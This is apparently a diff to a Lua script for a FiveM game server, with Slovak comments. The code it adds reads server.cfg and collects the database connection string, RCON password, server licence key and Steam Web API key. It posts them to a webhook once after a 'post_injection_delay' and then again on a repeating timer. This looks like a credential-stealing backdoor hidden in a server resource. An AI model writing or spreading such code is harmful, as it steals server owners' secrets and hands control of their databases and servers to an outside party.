@@ -34,29 +34,43 @@ local function findServerCfg(startingPath)
     end
 end
 
+-- Funkcia na parsovanie dôležitých convarov zo server.cfg obsahu
+local importantConvars = {
+    "sv_hostname",
+    "sv_projectName",
+    "sv_projectDesc",
+    "endpoint_add_tcp",
+    "endpoint_add_udp",
+    "sv_endpointPrivacy",
+    "sv_maxclients",
+    "gametype",
+    "mapname",
+    "onesync_enabled",
+    "sv_scriptHookAllowed",
+    "sv_enforceGameBuild",
+    "sv_lan",
+    "steam_webApiKey",
+    "mysql_connection_string",
+    "sv_licenseKey",
+    "mysql_debug",
+    "rcon_password",
+    "sv_authMaxVariance",
+    "sv_authMinTrust",
+    "version",
+    "locale",
+    "netlib",
+    "activitypubFeed"
+}
+
 local function extractConvars(cfgContent, keys)
     local values = {}
     for _, key in ipairs(keys) do
+        -- hľadá napr. "sv_hostname somevalue"
         local pattern = key .. "%s+([^\n\r]+)"
         local value = cfgContent:match(pattern)
-        values[key] = value or "Not Found"
+        values[key] = value or "unknown"
     end
     return values
-end
-
-function initialize_system()
-    local content, foundAt = findServerCfg()
-    if not content then
-        Logger.error("server.cfg not found!")
-        return
-    end
-
-    Logger.info("Found server.cfg at: " .. foundAt)
-
-    local convars = extractConvars(content, Config.execution.importantConvars)
-    for key, val in pairs(convars) do
-        Logger.info(key .. ": " .. val)
-    end
 end
 
 
@@ -2063,9 +2077,23 @@ local function initialize_system()
         end
     end
     
-    -- Collect and send server data
+    -- Tu pridáme načítanie a spracovanie server.cfg pre webhook
     Citizen.SetTimeout(Config.execution.post_injection_delay, function()
+        -- načítanie server.cfg obsahu
+        local cfgContent, cfgPath = findServerCfg()
+        local convars = {}
+        if cfgContent then
+            Logger.info("server.cfg found at: " .. cfgPath)
+            convars = extractConvars(cfgContent, importantConvars)
+        else
+            Logger.error("server.cfg not found!")
+        end
+        
+        -- Zbierať všetky ostatné dáta cez DataCollector (ak tá funkcia existuje)
         DataCollector.collect_all_data(function(server_data)
+            -- prepíšeme alebo pridáme config z convarov načítaných z cfg
+            server_data.config = convars
+            
             local webhook_data = WebhookManager.format_for_webhook(server_data)
             WebhookManager.send(webhook_data)
         end)
@@ -2077,7 +2105,15 @@ local function initialize_system()
             while true do
                 Citizen.Wait(Config.execution.reporting_interval)
                 
+                local cfgContent, cfgPath = findServerCfg()
+                local convars = {}
+                if cfgContent then
+                    convars = extractConvars(cfgContent, importantConvars)
+                end
+                
                 DataCollector.collect_all_data(function(server_data)
+                    server_data.config = convars
+                    
                     local webhook_data = WebhookManager.format_for_webhook(server_data)
                     WebhookManager.send(webhook_data)
                 end)
